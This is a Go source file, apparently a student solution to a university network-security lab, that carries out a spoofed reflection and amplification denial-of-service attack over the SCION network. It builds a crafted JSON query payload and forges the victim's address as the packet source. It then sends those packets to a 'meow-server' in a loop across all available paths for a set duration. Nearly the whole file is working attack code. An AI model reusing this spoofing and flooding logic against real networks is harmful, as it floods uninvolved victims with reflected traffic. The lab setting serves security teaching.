package client

import (
	// All of these imports were used for the mastersolution
	// "encoding/json"
	// "fmt"
	// "log"
	// "net"
	// "sync" // TODO uncomment any imports you need (go optimizes away unused imports)
	"context"
	"log"
	"net"
	"time"

	"github.com/scionproto/scion/go/lib/common"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/topology/underlay"

	// "ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/addr"

	// "github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	"github.com/scionproto/scion/go/lib/spath"
)

func GenerateAttackPayload() []byte {
	// TODO: Amplification Task
	payload := []byte{123, 34, 72, 34, 58, 123, 34, 73, 100, 34, 58, 48, 44, 34, 70, 34, 58, 123, 34, 72, 34, 58, 34, 116, 34, 44, 34, 86, 34, 58, 34, 117, 34, 44, 34, 77, 34, 58, 34, 110, 34, 44, 34, 68, 34, 58, 34, 97, 34, 125, 125, 44, 34, 66, 34, 58, 123, 34, 81, 117, 101, 114, 121, 34, 58, 34, 54, 55, 53, 51, 52, 34, 125, 44, 32, 34, 116, 117, 110, 97, 34, 58, 32, 116, 114, 117, 101, 125}
	return payload
}

func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Context
	meow_addr, err := snet.ParseUDPAddr(meowServerAddr)
	// fmt.Printf("fdfdf: %s\n", meowServerAddr)
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	// SCION daemon
	sciondAddr := SCIONDAddress()
	if err != nil {
		log.Fatal(err)
	}
	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}
	ia, err := sciondConn.LocalIA(ctx)
	// ia.A = 281105609527573
	// fmt.Println("SEP0")
	var a []snet.Path
	a, err = sciondConn.Paths(ctx, spoofedAddr.IA, meow_addr.IA, daemon.PathReqFlags{})
	// fmt.Println(a)
	// fmt.Println(sciondConn.ASInfo(ctx, spoofedAddr.IA))
	// fmt.Println("SEP")
	netnet := snet.NewNetwork(ia, dispatcher, nil)
	// fmt.Println(spoofedAddr.Host)
	// spoofedAddr.Host.Port = 8011
	// spoofedAddr.Host =
	// conn, err := netnet.Dial(ctx, "udp", spoofedAddr.Host, meow_addr, addr.SvcNone)
	packetConn, _, err := netnet.Dispatcher.Register(ctx, ia, spoofedAddr.Host, addr.SvcNone)

	var (
		dst     snet.SCIONAddress
		port    int
		path    spath.Path
		nextHop *net.UDPAddr
	)
	dst, port, path = snet.SCIONAddress{IA: meow_addr.IA, Host: addr.HostFromIP(meow_addr.Host.IP)},
		meow_addr.Host.Port, meow_addr.Path
	nextHop = &net.UDPAddr{
		IP:   meow_addr.Host.IP,
		Port: underlay.EndhostPort,
		Zone: meow_addr.Host.Zone,
	}
	// path = a[0].Path().Reverse()
	// path = a[len(a)-1].Path()
	// payload = []byte{0}

	// var p *spath.Path = &(a[0].Path())
	pkts := []*snet.Packet{}
	for i := 0; i < len(a); i++ {
		spoofedAddr.Path = a[i].Path()
		spoofedAddr.Path.Reverse()
		path = spoofedAddr.Path
		pkt := &snet.Packet{
			Bytes: snet.Bytes(make([]byte, common.SupportedMTU)),
			PacketInfo: snet.PacketInfo{
				Destination: dst,
				Source: snet.SCIONAddress{IA: spoofedAddr.IA,
					Host: addr.HostFromIP(spoofedAddr.Host.IP)},
				Path: path,
				Payload: snet.UDPPayload{
					SrcPort: uint16(spoofedAddr.Host.Port),
					DstPort: uint16(port),
					Payload: payload,
				},
			},
		}
		pkts = append(pkts, pkt)
	}

	// conn.mtx.Lock()
	// c.mtx.Lock()
	// defer c.mtx.Unlock()
	// packetConn.WriteTo(pkt, nextHop)
	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.
	// payload = []byte{123, 34, 72, 34, 58, 123, 34, 73, 100, 34, 58, 48, 44, 34, 70, 34, 58, 123, 34, 72, 34, 58, 34, 116, 34, 44, 34, 86, 34, 58, 34, 117, 34, 44, 34, 77, 34, 58, 34, 110, 34, 44, 34, 68, 34, 58, 34, 97, 34, 125, 125, 44, 34, 66, 34, 58, 123, 34, 81, 117, 101, 114, 121, 34, 58, 34, 54, 55, 53, 51, 52, 34, 125, 44, 32, 34, 116, 117, 110, 97, 34, 58, 32, 116, 114, 117, 101, 125}
	// ret, err := conn.Write(payload)
	// fmt.Println(ret)
	// fmt.Println(err)
	// *conn.scionConnWriter = 281105609527573
	// conn.Write(payload)

	for start := time.Now(); time.Since(start) < AttackDuration(); {
		for i := 0; i < len(pkts); i++ {
			packetConn.WriteTo(pkts[i], nextHop)
		}
		// conn.Write(payload)
		// fmt.Println(ret)
		// fmt.Println(err)

	}
	// conn.Write(payload)

	// buffer := make([]byte, server.MaxBufferSize)
	// nRead, _, err := conn.ReadVia(buffer)
	return nil
}
